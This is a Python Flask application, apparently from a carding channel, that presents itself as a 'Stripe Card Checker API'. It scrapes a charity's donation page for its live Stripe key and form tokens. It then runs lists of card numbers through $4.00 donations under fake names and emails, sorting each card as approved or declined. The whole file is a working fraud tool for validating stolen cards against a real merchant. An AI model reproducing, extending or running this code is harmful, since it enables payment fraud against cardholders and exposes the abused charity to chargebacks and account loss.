from flask import Flask, request, jsonify
import requests
import re
import random
import time
from faker import Faker
import threading
import logging

# Setup logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

class RateLimiter:
    def __init__(self):
        self.last_request_time = 0
        self.delay = 14  # 14 seconds delay
        self.lock = threading.Lock()
    
    def wait_if_needed(self):
        """Wait if needed to maintain 14-second delay between requests"""
        with self.lock:
            current_time = time.time()
            time_since_last_request = current_time - self.last_request_time
            
            if time_since_last_request < self.delay:
                sleep_time = self.delay - time_since_last_request
                logger.info(f"Rate limiting: waiting {sleep_time:.2f} seconds")
                time.sleep(sleep_time)
            
            self.last_request_time = time.time()

# Global rate limiter
rate_limiter = RateLimiter()

class PaymentProcessor:
    def __init__(self):
        self.r = requests.Session()
        self.fake = Faker()
        self.amount = '4.00'  # Changed to $4.00
        self.email = f"usera{random.randint(1000,9999)}@gmail.com"
        self.url = 'freedom-ride.org'
        self.payment_user_agent = 'stripe.js%2Fa28b4dac1e%3B+stripe-js-v3%2Fa28b4dac1e%3B+split-card-element'
        self.headers = {
            'authority': 'api.stripe.com',
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
        }

    def get_payment_data(self):
        """Get payment page data without proxy"""
        try:
            # Apply rate limiting
            rate_limiter.wait_if_needed()
            
            logger.info("Fetching payment page data...")
            r1 = self.r.get(
                f'https://www.{self.url}/donate/', 
                headers=self.headers,
                timeout=30
            )
            
            if r1.status_code != 200:
                return False, f"Failed to fetch payment page: HTTP {r1.status_code}"
                
            r1_text = r1.text
            
            # Extract required payment data
            pk_live_match = re.search(r'(pk_live_[A-Za-z0-9_-]+)', r1_text)
            acct_match = re.search(r'(acct_[A-Za-z0-9_-]+)', r1_text)
            givewp_match = re.search(r'name="give-form-id" value="(.*?)"', r1_text)
            givewp2_match = re.search(r'name="give-form-id-prefix" value="(.*?)"', r1_text)
            givewp3_match = re.search(r'name="give-form-hash" value="(.*?)"', r1_text)
            
            if not all([pk_live_match, acct_match, givewp_match, givewp2_match, givewp3_match]):
                return False, "Failed to extract payment parameters from page"
                
            self.pk_live = pk_live_match.group(1)
            self.acct = acct_match.group(1)
            self.givewp = givewp_match.group(1)
            self.givewp2 = givewp2_match.group(1)
            self.givewp3 = givewp3_match.group(1)
            
            logger.info("Successfully extracted payment data")
            return True, "Success"
            
        except requests.exceptions.Timeout:
            return False, "Timeout while fetching payment data"
        except requests.exceptions.ConnectionError:
            return False, "Connection error - please check your internet connection"
        except Exception as e:
            return False, f"Error getting payment data: {str(e)}"

    def process_payment(self, card_data):
        """Process payment without proxy - $4.00 charge"""
        try:
            n, mm, yy, cvc = card_data.split('|')
        except:
            return 'Error: Invalid card format. Use: number|mm|yy|cvc'

        try:
            # Get payment data with rate limiting
            success, message = self.get_payment_data()
            if not success:
                return f'Error: {message}'

            # Apply rate limiting before payment method creation
            rate_limiter.wait_if_needed()
            
            # Create payment method
            logger.info("Creating payment method...")
            data = f'type=card&billing_details[name]={self.fake.first_name()}+{self.fake.last_name()}&billing_details[email]={self.email}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent={self.payment_user_agent}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=split-card-element&client_attribution_metadata[merchant_integration_version]=2017&key={self.pk_live}&_stripe_account={self.acct}'
            
            r2 = self.r.post(
                'https://api.stripe.com/v1/payment_methods', 
                headers=self.headers, 
                data=data,
                timeout=30
            )
            
            if r2.status_code != 200:
                error_msg = r2.text[:100] if r2.text else 'No response text'
                return f'Error: Payment method creation failed - {error_msg}'
                
            payment_method_id = r2.json()['id']
            logger.info(f"Payment method created: {payment_method_id}")

            # Apply rate limiting before final payment
            rate_limiter.wait_if_needed()
            
            # Complete payment - $4.00 charge
            logger.info("Processing final payment - $4.00 charge...")
            payment_data = {
                'give-honeypot': '',
                'give-form-id-prefix': self.givewp2,
                'give-form-id': self.givewp,
                'give-form-title': 'Freedom Funds',
                'give-current-url': f'https://www.{self.url}/donate/',
                'give-form-url': f'https://www.{self.url}/donate/',
                'give-form-minimum': self.amount,
                'give-form-maximum': '999999.99',
                'give-form-hash': self.givewp3,
                'give-price-id': 'custom',
                'give-amount': self.amount,  # $4.00
                'give_stripe_payment_method': payment_method_id,
                'payment-mode': 'stripe',
                'give_first': self.fake.first_name(),
                'give_last': self.fake.last_name(),
                'give_company_option': 'no',
                'give_company_name': '',
                'give_email': self.email,
                'give_comment': '',
                'card_name': self.fake.name(),
                'give_action': 'purchase',
                'give-gateway': 'stripe',
            }

            r3 = self.r.post(
                f'https://www.{self.url}/donate/', 
                params={'payment-mode': 'stripe', 'form-id': self.givewp}, 
                headers=self.headers, 
                data=payment_data,
                timeout=30
            )
            
            if 'Donation Confirmation' in r3.text:
                logger.info("Payment successful - CHARGE 4.00$")
                return 'CHARGE 4.00$'
            else:
                msg_match = re.search(r':\s*(.*?)<br>', r3.text)
                if msg_match:
                    decline_msg = msg_match.group(1)
                    logger.info(f"Payment declined: {decline_msg}")
                    return decline_msg
                else:
                    logger.info("Payment failed with unknown error")
                    return 'Error: Payment failed - Unknown error'
                    
        except requests.exceptions.Timeout:
            return 'Error: Request timeout - please try again'
        except requests.exceptions.ConnectionError:
            return 'Error: Connection failed - please check your internet connection'
        except Exception as e:
            return f'Error: {str(e)}'

# Base response template
def base_response(message, status="success"):
    return {
        "status": status,
        "message": message,
        "developer": "@NaN_xax",
        "channel": "https://t.me/+LPjSsuJXV7owMGVk",
        "timestamp": time.time(),
        "rate_limit": "14 seconds between requests",
        "charge_amount": "4.00$"
    }

@app.route('/')
def home():
    return jsonify({
        "message": "Stripe Card Checker API - $4.00 Charge",
        "developer": "@NaN_xax",
        "channel": "https://t.me/+LPjSsuJXV7owMGVk",
        "endpoints": {
            "POST /api/check": "Check single card",
            "POST /api/bulk-check": "Check multiple cards (max 50)",
            "POST /api/check-multiple": "Check multiple cards (max 20)", 
            "GET /api/status": "Check API status",
            "GET /api/health": "Health check"
        },
        "rate_limit": "14 seconds between requests",
        "charge_amount": "4.00$"
    })

@app.route('/api/health')
def health_check():
    return jsonify(base_response("API is running - No proxy required - $4.00 charge"))

@app.route('/api/status')
def api_status():
    """Get API status and rate limit info"""
    status_info = base_response("API Status - $4.00 Charge")
    status_info.update({
        "rate_limit_seconds": 14,
        "last_request_time": rate_limiter.last_request_time,
        "time_since_last_request": time.time() - rate_limiter.last_request_time,
        "next_available_in": max(0, 14 - (time.time() - rate_limiter.last_request_time)),
        "charge_amount": "4.00$"
    })
    return jsonify(status_info)

@app.route('/api/check', methods=['POST'])
def check_card():
    """Check a single card without proxy - $4.00 charge"""
    try:
        data = request.get_json()
        
        if not data:
            return jsonify(base_response("Error: No JSON data provided", "error")), 400
        
        card = data.get('card')
        
        if not card:
            return jsonify(base_response("Error: Card data is required", "error")), 400
        
        logger.info(f"Processing card: {card.split('|')[0][:6]}****** - $4.00 charge")
        
        # Create payment processor (no proxy)
        processor = PaymentProcessor()
        
        # Process payment
        result = processor.process_payment(card)
        
        response_data = base_response(result)
        response_data["card"] = card
        response_data["amount"] = processor.amount  # $4.00
        
        if 'CHARGE' in result:
            response_data["status"] = "approved"
        elif 'Error' in result:
            response_data["status"] = "error"
        else:
            response_data["status"] = "declined"
        
        logger.info(f"Card processing completed: {response_data['status']} - $4.00")
        return jsonify(response_data)
        
    except Exception as e:
        logger.error(f"Error in check_card: {str(e)}")
        error_response = base_response(f"Internal server error: {str(e)}", "error")
        return jsonify(error_response), 500

@app.route('/api/bulk-check', methods=['POST'])
def bulk_check():
    """Check multiple cards with proper rate limiting - $4.00 charge"""
    try:
        data = request.get_json()
        
        if not data:
            return jsonify(base_response("Error: No JSON data provided", "error")), 400
        
        cards = data.get('cards', [])
        
        if not cards:
            return jsonify(base_response("Error: Cards array is required", "error")), 400
        
        if len(cards) > 50:
            return jsonify(base_response("Error: Maximum 50 cards per request", "error")), 400
        
        results = []
        total_cards = len(cards)
        
        logger.info(f"Starting bulk check for {total_cards} cards - $4.00 charge each")
        
        for i, card_data in enumerate(cards):
            try:
                logger.info(f"Processing card {i+1}/{total_cards} - $4.00 charge")
                
                processor = PaymentProcessor()
                result = processor.process_payment(card_data)
                
                card_result = {
                    "card": card_data,
                    "result": result,
                    "status": "approved" if 'CHARGE' in result else "declined",
                    "index": i + 1,
                    "total": total_cards,
                    "amount": "4.00$"
                }
                
                results.append(card_result)
                
                # Log progress
                logger.info(f"Card {i+1}/{total_cards} - Status: {card_result['status']} - $4.00")
                
            except Exception as e:
                error_result = {
                    "card": card_data,
                    "result": f"Error: {str(e)}",
                    "status": "error",
                    "index": i + 1,
                    "total": total_cards,
                    "amount": "4.00$"
                }
                results.append(error_result)
                logger.error(f"Error processing card {i+1}: {str(e)}")
        
        # Calculate statistics
        approved_count = len([r for r in results if r["status"] == "approved"])
        declined_count = len([r for r in results if r["status"] == "declined"])
        error_count = len([r for r in results if r["status"] == "error"])
        
        response_data = base_response("Bulk check completed - $4.00 charge per card")
        response_data.update({
            "results": results,
            "total_cards": total_cards,
            "approved_count": approved_count,
            "declined_count": declined_count,
            "error_count": error_count,
            "estimated_time": f"{(total_cards * 14) / 60:.1f} minutes",
            "total_charge_amount": f"${approved_count * 4:.2f}",
            "charge_amount_per_card": "4.00$"
        })
        
        logger.info(f"Bulk check completed: {approved_count} approved, {declined_count} declined, {error_count} errors - Total: ${approved_count * 4:.2f}")
        return jsonify(response_data)
        
    except Exception as e:
        logger.error(f"Error in bulk_check: {str(e)}")
        error_response = base_response(f"Internal server error: {str(e)}", "error")
        return jsonify(error_response), 500

@app.route('/api/check-multiple', methods=['POST'])
def check_multiple():
    """Alternative endpoint for multiple cards with better progress tracking - $4.00 charge"""
    try:
        data = request.get_json()
        cards = data.get('cards', [])
        
        if not cards:
            return jsonify(base_response("Error: Cards array is required", "error")), 400
        
        if len(cards) > 20:
            return jsonify(base_response("Error: Maximum 20 cards for this endpoint", "error")), 400
        
        results = []
        
        for i, card in enumerate(cards):
            processor = PaymentProcessor()
            result = processor.process_payment(card)
            
            results.append({
                "card": card,
                "result": result,
                "status": "approved" if 'CHARGE' in result else "declined",
                "progress": f"{i+1}/{len(cards)}",
                "amount": "4.00$"
            })
        
        response_data = base_response("Multiple cards processed - $4.00 charge per card")
        response_data["results"] = results
        return jsonify(response_data)
        
    except Exception as e:
        error_response = base_response(f"Error: {str(e)}", "error")
        return jsonify(error_response), 500

if __name__ == '__main__':
    logger.info("Starting Stripe Card Checker API - $4.00 Charge")
    logger.info("No Proxy Required - Rate Limit: 14 seconds between requests")
    logger.info("Developer: @NaN_xax")
    logger.info("Channel: https://t.me/+LPjSsuJXV7owMGVk")
    logger.info("Charge Amount: $4.00 per transaction")
    
    # Run the application
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
